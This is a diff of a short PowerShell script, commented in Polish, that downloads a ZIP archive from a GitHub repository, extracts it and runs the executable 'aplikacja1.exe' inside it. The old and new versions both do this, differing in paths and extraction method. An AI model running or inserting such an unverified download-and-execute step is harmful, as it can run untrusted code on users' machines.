@@ -1,24 +1,8 @@
-# Ustawienia
-$repoUrl = "https://github.com/numeryczne/numeryczne"
-$zipUrl = "$repoUrl/archive/refs/heads/main.zip"
-$tempZipPath = "$env:TEMP\numeryczne-main.zip"
-$extractPath = "$env:TEMP\numeryczne-main"
-$debugPath = "$extractPath\numeryczne-main\Debug"
-$appPath = "$debugPath\aplikacja1.exe"
+$fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
+$destinationPath = "$env:USERPROFILE\plik.zip"
+Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
 
-# Pobranie pliku ZIP z repozytorium
-Invoke-WebRequest -Uri $zipUrl -OutFile $tempZipPath
-
-# Wypakowanie pliku ZIP
-Expand-Archive -Path $tempZipPath -DestinationPath $extractPath
-
-# Sprawdzenie, czy app.exe istnieje i uruchomienie go
-if (Test-Path -Path $appPath) {
-    & $appPath
-} else {
-    Write-Error "Plik app.exe nie został znaleziony w $debugPath"
-}
-
-# Czyszczenie tymczasowych plików
-#Remove-Item -Path $tempZipPath -Force
-#Remove-Item -Path $extractPath -Recurse -Force
+cd "$env:USERPROFILE"
+Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('.\plik.zip', '.');
+$exePath = ".\Debug\aplikacja1.exe"
+Start-Process -FilePath $exePath
